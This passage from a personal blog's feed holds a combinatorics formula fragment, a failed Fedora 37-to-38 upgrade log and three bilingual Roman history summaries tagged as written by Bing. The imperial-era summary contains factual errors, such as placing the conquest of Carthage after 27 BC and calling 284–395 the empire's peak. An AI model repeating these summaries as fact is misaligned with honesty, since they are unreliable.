153Z"></path></g><g data-mml-node="mn" transform="translate(8707.1,0)"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path></g></g></g></svg></mjx-container></p><p>即将6本相同书分给4个班级，每班至少1本=<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.609ex;" xmlns="http://www.w3.org/2000/svg" width="2.825ex" height="2.607ex" role="img" focusable="false" viewBox="0 -883.2 1248.8 1152.3"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msubsup"><g data-mml-node="mi"><path data-c="1D436" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q484 659 454 652T382 628T299 572T226 479Q194 422 175 346T156 222Q156 108 232 58Q280 24 350 24Q441 24 512 92T606 240Q610 253 612 255T628 257Q648 257 648 248Q648 243 647 239Q618 132 523 55T319 -22Q206 -22 128 53T50 252Z"></path></g><g data-mml-node="TeXAtom" transform="translate(845.3,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g></g><g data-mml-node="TeXAtom" transform="translate(748,-253.5) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g></g></g></g></g></svg></mjx-container></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="数学" scheme="http://example.com/categories/%E6%95%B0%E5%AD%A6/"/>
    
    
    <category term="排列组合" scheme="http://example.com/tags/%E6%8E%92%E5%88%97%E7%BB%84%E5%90%88/"/>
    
    <category term="数学" scheme="http://example.com/tags/%E6%95%B0%E5%AD%A6/"/>
    
    <category term="奇思妙想" scheme="http://example.com/tags/%E5%A5%87%E6%80%9D%E5%A6%99%E6%83%B3/"/>
    
  </entry>
  
  <entry>
    <title>fedora更新 悲</title>
    <link href="http://example.com/2023/04/29/fedora37to38/"/>
    <id>http://example.com/2023/04/29/fedora37to38/</id>
    <published>2023-04-29T14:59:53.000Z</published>
    <updated>2024-11-07T08:34:21.252Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[xuchengxi@fedora 下载]$ sudo dnf system-upgrade download --releasever=38</span><br><span class="line">[sudo] xuchengxi 的密码：Before you continue ensure that your system is fully upgraded by running &quot;dnf --refresh upgrade&quot;. Do you want to continue [y/N]: y</span><br><span class="line">Copr repo for onedriver owned by jstaf                                        245  B/s | 3.3 kB     00:13    </span><br><span class="line">Fedora 38 - x86_64                                                            1.7 kB/s | 5.6 kB     00:03    </span><br><span class="line">Fedora 38 - x86_64 - Debug                                                    471  B/s | 4.6 kB     00:10    </span><br><span class="line">Fedora 38 - Source                                                            2.9 kB/s | 5.3 kB     00:01    </span><br><span class="line">Fedora 38 openh264 (From Cisco) - x86_64                                      300  B/s | 989  B     00:03    </span><br><span class="line">Fedora 38 openh264 (From Cisco) - x86_64 - Debug                              595  B/s | 997  B     00:01    </span><br><span class="line">Fedora Modular 38 - x86_64                                                    1.0 kB/s | 5.5 kB     00:05    </span><br><span class="line">Fedora Modular 38 - x86_64 - Debug                                            934  B/s | 4.6 kB     00:05    </span><br><span class="line">Fedora Modular 38 - Source                                                    913  B/s | 5.2 kB     00:05    </span><br><span class="line">Fedora 38 - x86_64 - Updates                                                   11 kB/s | 6.0 kB     00:00    </span><br><span class="line">Fedora 38 - x86_64 - Updates                                                  152 kB/s | 500 kB     00:03    </span><br><span class="line">Fedora 38 - x86_64 - Updates - Debug                                          9.9 kB/s | 5.3 kB     00:00    </span><br><span class="line">Fedora 38 - x86_64 - Updates - Debug                                          3.2 kB/s | 4.9 kB     00:01    </span><br><span class="line">Fedora 38 - Updates Source                                                     15 kB/s | 5.8 kB     00:00    </span><br><span class="line">Fedora 38 - Updates Source                                                    1.6 kB/s | 5.9 kB     00:03    </span><br><span class="line">Fedora Modular 38 - x86_64 - Updates                                          1.1 kB/s | 5.4 kB     00:04    </span><br><span class="line">Fedora Modular 38 - x86_64 - Updates - Debug                                  8.6 kB/s | 4.4 kB     00:00    </span><br><span class="line">Fedora Modular 38 - Updates Source                                            5.7 kB/s | 5.2 kB     00:00    </span><br><span class="line">FZUG fc38 - Free                                                              8.6 kB/s | 3.0 kB     00:00    </span><br><span class="line">FZUG fc38 - Nonfree                                                            11 kB/s | 3.0 kB     00:00    </span><br><span class="line">google-chrome                                                                 2.5 kB/s | 1.3 kB     00:00    </span><br><span class="line">microsoft-edge                                                                1.9 kB/s | 1.5 kB     00:00    </span><br><span class="line">RPM Fusion for Fedora 38 - Free                                               1.0 kB/s |  11 kB     00:10    </span><br><span class="line">RPM Fusion for Fedora 38 - Free - Updates                                     586  B/s | 9.5 kB     00:16    </span><br><span class="line">RPM Fusion for Fedora 38 - Nonfree                                            3.0 kB/s |  15 kB     00:04    </span><br><span class="line">RPM Fusion for Fedora 38 - Nonfree - Updates                                  7.7 kB/s |  13 kB     00:01    </span><br><span class="line">WineHQ packages                                                               2.1 kB/s | 3.0 kB     00:01    </span><br><span class="line">没有和组 &quot;gimp-heif-plugin&quot; 匹配的没有和组 &quot;hanazono-fonts&quot; 匹配的没有和组 &quot;vlgothic-p-fonts&quot; 匹配的没有和组 &quot;google-noto-looped-lao-ui-vf-fonts&quot; 匹配的没有和组 &quot;google-noto-sans-myanmar-ui-vf-fonts&quot; 匹配的没有和组 &quot;scim-bridge-gtk&quot; 匹配的没有和组 &quot;drehatlas-warender-bibliothek-fonts&quot; 匹配的没有和组 &quot;google-noto-serif-nyiakeng-puachue-hmong-vf-fonts&quot; 匹配的没有和组 &quot;google-noto-sans-oriya-ui-vf-fonts&quot; 匹配的没有和组 &quot;sil-scheherazade-fonts&quot; 匹配的没有和组 &quot;google-noto-sans-kannada-ui-vf-fonts&quot; 匹配的没有和组 &quot;vlgothic-fonts&quot; 匹配的没有和组 &quot;google-noto-sans-malayalam-ui-vf-fonts&quot; 匹配的没有和组 &quot;google-noto-sans-khmer-ui-vf-fonts&quot; 匹配的没有和组 &quot;google-noto-sans-telugu-ui-vf-fonts&quot; 匹配的没有和组 &quot;google-noto-looped-thai-ui-vf-fonts&quot; 匹配的没有和组 &quot;google-noto-sans-sinhala-ui-vf-fonts&quot; 匹配的没有和组 &quot;drehatlas-xaporho-fonts&quot; 匹配的没有和组 &quot;google-noto-sans-thai-ui-vf-fonts&quot; 匹配的没有和组 &quot;google-noto-serif-tamil-slanted-vf-fonts&quot; 匹配的没有和组 &quot;ipa-ex-gothic-fonts&quot; 匹配的没有和组 &quot;yanone-tagesschrift-fonts&quot; 匹配的没有和组 &quot;google-noto-sans-tamil-ui-vf-fonts&quot; 匹配的没有和组 &quot;google-noto-serif-dogra-vf-fonts&quot; 匹配的没有和组 &quot;reiserfs-utils&quot; 匹配的没有和组 &quot;tlomt-junction-fonts&quot; 匹配的没有和组 &quot;cups-bjnp&quot; 匹配的没有和组 &quot;scim-anthy&quot; 匹配的没有和组 &quot;google-noto-sans-hebrew-droid-vf-fonts&quot; 匹配的没有和组 &quot;ht-caladea-fonts&quot; 匹配的没有和组 &quot;ubuntu-title-fonts&quot; 匹配的没有和组 &quot;authselect-compat&quot; 匹配的没有和组 &quot;google-noto-looped-thai-vf-fonts&quot; 匹配的没有和组 &quot;culmus-shofar-fonts&quot; 匹配的没有和组 &quot;vollkorn-fonts&quot; 匹配的没有和组 &quot;google-noto-sans-lao-ui-vf-fonts&quot; 匹配的没有和组 &quot;google-noto-looped-lao-vf-fonts&quot; 匹配的没有和组 &quot;google-noto-sans-hebrew-new-vf-fonts&quot; 匹配的没有和组 &quot;google-noto-sans-bengali-ui-vf-fonts&quot; 匹配的没有和组 &quot;google-noto-kufi-arabic-vf-fonts&quot; 匹配的没有和组 &quot;google-noto-sans-tai-viet-vf-fonts&quot; 匹配的没有和组 &quot;cave9-mutante-fonts&quot; 匹配的没有和组 &quot;imsettings-systemd&quot; 匹配的没有和组 &quot;google-noto-sans-display-vf-fonts&quot; 匹配的没有和组 &quot;plasma-workspace-xorg&quot; 匹配的没有和组 &quot;google-noto-sans-gurmukhi-ui-vf-fonts&quot; 匹配的没有和组 &quot;google-noto-serif-display-vf-fonts&quot; 匹配的没有和组 &quot;google-noto-sans-zanabazar-square-vf-fonts&quot; 匹配的没有和组 &quot;scim-bridge-qt3&quot; 匹配的没有和组 &quot;scim-bridge-qt&quot; 匹配的没有和组 &quot;google-noto-sans-arabic-ui-vf-fonts&quot; 匹配的没有和组 &quot;google-noto-sans-tamil-supplement-vf-fonts&quot; 匹配的没有和组 &quot;google-noto-sans-runic-vf-fonts&quot; 匹配的没有和组 &quot;polarsys-b612-sans-fonts&quot; 匹配的没有和组 &quot;ipa-ex-mincho-fonts&quot; 匹配的没有和组 &quot;kanjistrokeorders-fonts&quot; 匹配的错误： 问题 1: 安装的软件包的问题 iptables-nft-1.8.8-4.fc37.x86_64</span><br><span class="line">  - 软件包 kernel-lt-5.4.228-1.el7.elrepo.x86_64 与 iptables &lt; 1.3.2-1（由 iptables-nft-1.8.9-2.fc38.x86_64 提供）冲突  - iptables-nft-1.8.8-4.fc37.x86_64 不属于 distupgrade 仓库  - 安装的软件包的问题 kernel-lt-5.4.228-1.el7.elrepo.x86_64</span><br><span class="line"> 问题 2: 安装的软件包的问题 libswscale-free-5.1.3-1.fc37.x86_64</span><br><span class="line">  - 软件包 ffmpeg-libs-6.0-6.fc38.x86_64 与 libswscale-free（由 libswscale-free-6.0-2.fc38.x86_64 提供）冲突  - 软件包 ffmpeg-libs-6.0-6.fc38.x86_64 与 libswscale-free（由 libswscale-free-6.0-4.fc38.x86_64 提供）冲突  - 软件包 ffmpeg-6.0-6.fc38.x86_64 需要 ffmpeg-libs(x86-64) = 6.0-6.fc38，但没有提供者可以被安装  - libswscale-free-5.1.3-1.fc37.x86_64 不属于 distupgrade 仓库  - 冲突的请求</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
    <summary type="html">=(</summary>
    
    
    
    <category term="linux" scheme="http://example.com/categories/linux/"/>
    
    
    <category term="linux" scheme="http://example.com/tags/linux/"/>
    
    <category term="fedora" scheme="http://example.com/tags/fedora/"/>
    
    <category term="翻车" scheme="http://example.com/tags/%E7%BF%BB%E8%BD%A6/"/>
    
  </entry>
  
  <entry>
    <title>罗马历史摘要共和时代</title>
    <link href="http://example.com/2023/04/04/%E7%BD%97%E9%A9%AC%E5%8E%86%E5%8F%B2%E6%91%98%E8%A6%81%E5%85%B1%E5%92%8C%E6%97%B6%E4%BB%A3/"/>
    <id>http://example.com/2023/04/04/%E7%BD%97%E9%A9%AC%E5%8E%86%E5%8F%B2%E6%91%98%E8%A6%81%E5%85%B1%E5%92%8C%E6%97%B6%E4%BB%A3/</id>
    <published>2023-04-04T10:20:53.000Z</published>
    <updated>2024-11-07T08:34:21.256Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="罗马历史摘要共和时代"><a href="#罗马历史摘要共和时代" class="headerlink" title="罗马历史摘要共和时代"></a>罗马历史摘要共和时代</h1><ul><li>共和时代从公元前509年开始，当时罗马人废除了“王政”，改行共和制度，结束了王权时期，开始了近500年的罗马共和国时期。</li><li>共和时代早期，罗马政权掌握在元老院、公民大会以及执政官、监察官等行政长官手中，逐步形成寡头共和政体。</li><li>从公元前3世纪中叶起，罗马共和国开始向海外扩张。通过布匿战争、马其顿战争和叙利亚战争，罗马人确立了在地中海地区的霸权。</li><li>共和时代后期，罗马社会出现了严重的贫富差距和阶级矛盾。贵族占有大量的土地和奴隶，而平民和自耕农失去了生活保障。士兵也不再忠于国家，而是依附于个人将领。</li><li>为了改革社会不平等，格拉古兄弟提出了分配土地给穷人的方案，但遭到贵族的反对和暗杀。马略则推行了募兵制，使大批无地或少地公民涌入军队。</li><li>共和时代末期，罗马陷入了长期的内战。先后出现了前三头同盟（克拉苏、凯撒、庞培）、后三头同盟（安东尼、雷必达、屋大维）等军事集团。屋大维最终击败了所有的对手，成为事实上的独裁者。</li><li>公元前27年，元老院授予屋大维“奥古斯都”的尊号，建立元首制。屋大维大权在握成为第一位皇帝，罗马共和国结束了，古罗马进入了帝国时代。</li></ul><h1 id="Summary-of-Roman-History-in-the-Republican-Era"><a href="#Summary-of-Roman-History-in-the-Republican-Era" class="headerlink" title="Summary of Roman History in the Republican Era"></a>Summary of Roman History in the Republican Era</h1><ul><li>The republican era began in 509 BC, when the Romans abolished the “monarchy” and adopted the republican system, ending the monarchical period and starting the nearly 500-year period of the Roman Republic.</li><li>In the early republican era, the Roman power was held by the Senate, the Assembly of Citizens, and executive magistrates such as consuls and censors, gradually forming an oligarchic republic.</li><li>From the mid-3rd century BC, the Roman Republic began to expand overseas. Through the Punic Wars, the Macedonian Wars and the Syrian Wars, the Romans established their hegemony in the Mediterranean region.</li><li>In the late republican era, Roman society faced serious wealth gap and class conflict. The nobles owned large amounts of land and slaves, while the commoners and small farmers lost their livelihood. The soldiers also became loyal to individual generals rather than to the state.</li><li>To reform social inequality, the Gracchi brothers proposed a plan to distribute land to the poor, but were opposed and assassinated by the nobles. Marius implemented a recruitment system that allowed a large number of landless or poor citizens to join the army.</li><li>At the end of the republican era, Rome fell into a long civil war. There were military groups such as the First Triumvirate (Crassus, Caesar, Pompey) and the Second Triumvirate (Antony, Lepidus, Octavian</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="历史" scheme="http://example.com/categories/%E5%8E%86%E5%8F%B2/"/>
    
    
    <category term="bing写的" scheme="http://example.com/tags/bing%E5%86%99%E7%9A%84/"/>
    
    <category term="罗马" scheme="http://example.com/tags/%E7%BD%97%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>罗马历史摘要帝国时代</title>
    <link href="http://example.com/2023/04/04/%E7%BD%97%E9%A9%AC%E5%8E%86%E5%8F%B2%E6%91%98%E8%A6%81%E5%B8%9D%E5%9B%BD%E6%97%B6%E4%BB%A3/"/>
    <id>http://example.com/2023/04/04/%E7%BD%97%E9%A9%AC%E5%8E%86%E5%8F%B2%E6%91%98%E8%A6%81%E5%B8%9D%E5%9B%BD%E6%97%B6%E4%BB%A3/</id>
    <published>2023-04-04T10:20:53.000Z</published>
    <updated>2024-11-07T08:34:21.256Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="罗马历史摘要帝国时代"><a href="#罗马历史摘要帝国时代" class="headerlink" title="罗马历史摘要帝国时代"></a>罗马历史摘要帝国时代</h1><ul><li>帝国时代从公元前27年开始，当时屋大维被元老院授予“奥古斯都”和“祖国之父”的称号，确立了元首制，结束了共和国的动荡。</li><li>帝国时代分为早期、中期和后期三个阶段：<ul><li>早期（公元前27年-284年），是罗马帝国的成长期，名义上仍是共和国，实际上是皇帝专制。在这个时期，罗马帝国进行了多次对外战争，征服了迦太基、埃及、帕提亚等地区，疆域达到最大。</li><li>中期（284年-395年），是罗马帝国的鼎盛时期，经济空前繁荣，文化达到极盛。在这个时期，戴克里先和君士坦丁进行了重要的改革，承认了基督教的合法性，迁都拜占庭（改名为君士坦丁堡）。</li><li>后期（395年-476年&#x2F;1453年），是罗马帝国的衰落和分裂时期，社会矛盾尖锐，内乱不断，外族入侵频繁。在这个时期，罗马帝国分裂为东西两部，西罗马帝国于476年灭亡，东罗马帝国（又称拜占庭帝国）于1453年被奥斯曼土耳其帝国灭亡。</li></ul></li></ul><h1 id="Summary-of-Roman-History-in-the-Imperial-Era"><a href="#Summary-of-Roman-History-in-the-Imperial-Era" class="headerlink" title="Summary of Roman History in the Imperial Era"></a>Summary of Roman History in the Imperial Era</h1><ul><li>The imperial era began in 27 BC, when Octavian was granted the titles of “Augustus” and “Father of the Fatherland” by the Senate, establishing the principate, ending the turmoil of the republic.</li><li>The imperial era is divided into three stages:<ul><li>Early period (27 BC-284 AD), which was the growth period of the Roman Empire, nominally still a republic, but actually an imperial autocracy. In this period, the Roman Empire waged many wars against foreign countries, conquering Carthage, Egypt, Parthia and other regions, reaching its maximum territory.</li><li>Middle period (284-395 AD), which was the peak period of the Roman Empire, with unprecedented economic prosperity and cultural brilliance. In this period, Diocletian and Constantine carried out important reforms, recognized the legitimacy of Christianity, moved the capital to Byzantium (renamed Constantinople).</li><li>Late period (395-476&#x2F;1453 AD), which was the decline and division period of the Roman Empire, with sharp social contradictions, frequent civil wars and foreign invasions. In this period, the Roman Empire split into two parts, east and west. The Western Roman Empire collapsed in 476 AD, and the Eastern Roman Empire (also known as the Byzantine Empire) was destroyed by the Ottoman Turkish Empire in 1453 AD.</li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="历史" scheme="http://example.com/categories/%E5%8E%86%E5%8F%B2/"/>
    
    
    <category term="bing写的" scheme="http://example.com/tags/bing%E5%86%99%E7%9A%84/"/>
    
    <category term="罗马" scheme="http://example.com/tags/%E7%BD%97%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>罗马历史摘要王政时代</title>
    <link href="http://example.com/2023/04/04/%E7%BD%97%E9%A9%AC%E5%8E%86%E5%8F%B2%E6%91%98%E8%A6%81%E7%8E%8B%E6%94%BF%E6%97%B6%E4%BB%A3/"/>
    <id>http://example.com/2023/04/04/%E7%BD%97%E9%A9%AC%E5%8E%86%E5%8F%B2%E6%91%98%E8%A6%81%E7%8E%8B%E6%94%BF%E6%97%B6%E4%BB%A3/</id>
    <published>2023-04-04T10:20:53.000Z</published>
    <updated>2024-11-07T08:34:21.256Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="罗马历史摘要王政时代"><a href="#罗马历史摘要王政时代" class="headerlink" title="罗马历史摘要王政时代"></a>罗马历史摘要王政时代</h1><ul><li>罗马王政时代从公元前753年罗穆卢斯建立罗马城开始，到公元前509年因为塔尔昆尼乌斯·苏佩布斯的暴政而废除君主制，建立共和国而结束 。</li><li>第一位国王是罗穆卢斯，他根据传说在杀死了他的孪生兄弟雷穆斯后，在帕拉蒂尼山上建立了城市 。</li><li>其他的国王分别是努马·庞皮利乌斯、图卢斯·霍斯蒂利乌斯、安库斯·马尔基乌斯、卢基乌斯·塔尔昆尼乌斯·普里斯库斯、塞尔维乌斯·图利乌斯和卢基乌斯·塔尔昆尼乌斯·苏佩布斯 。</li><li>国王们都是由罗马人民选举出来的，他们对军事、宗教和民事事务拥有最高权力 。</li><li>国王们由一个由长老组成的议会——元老院和一个民众大会——古里亚大会来辅佐 。</li><li>王政时代结束于最后一位国王塔尔昆尼乌斯·苏佩布斯被卢基乌斯·尤尼乌斯·布鲁图斯和卢基乌斯·塔尔昆尼乌斯·科拉蒂努斯领导的一场起义推翻，起因是他的儿子强奸了一位贵族妇女卢克蕾西娅 。</li><li>君主制被共和制取代，两位执政官作为最高行政官，政府体制更加民主 。</li></ul><h1 id="Summary-of-Roman-history-in-the-regal-period"><a href="#Summary-of-Roman-history-in-the-regal-period" class="headerlink" title="Summary of Roman history in the regal period"></a>Summary of Roman history in the regal period</h1><ul><li>The regal period lasted from 753 BC to 509 BC and was marked by the rule of seven kings of Rome.</li><li>The first king was Romulus, who according to legend founded the city on the Palatine Hill after killing his twin brother Remus .</li><li>The other kings were Numa Pompilius, Tullus Hostilius, Ancus Marcius, Lucius Tarquinius Priscus, Servius Tullius, and Lucius Tarquinius Superbus .</li><li>The kings were elected by the people of Rome and had supreme authority over the military, religious, and civil affairs.</li><li>The kings were advised by a council of elders called the Senate and a popular assembly called the Curiate Assembly.</li><li>The regal period ended when the last king, Tarquinius Superbus, was overthrown by a revolt led by Lucius Junius Brutus and Lucius Tarquinius Collatinus after his son raped Lucretia, a noblewoman .</li><li>The monarchy was replaced by a republic with two consuls as chief magistrates and a more democratic system of government.</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="历史" scheme="http://example.com/categories/%E5%8E%86%E5%8F%B2/"/>
    
    
    <category term="bing写的" scheme="http://example.com/tags/bing%E5%86%99%E7%9A%84/"/>
    
    <category term="罗马" scheme="http://example.com/tags/%E7%BD%97%E9%A9%AC/"/>
    
  </entry>
  
</feed>
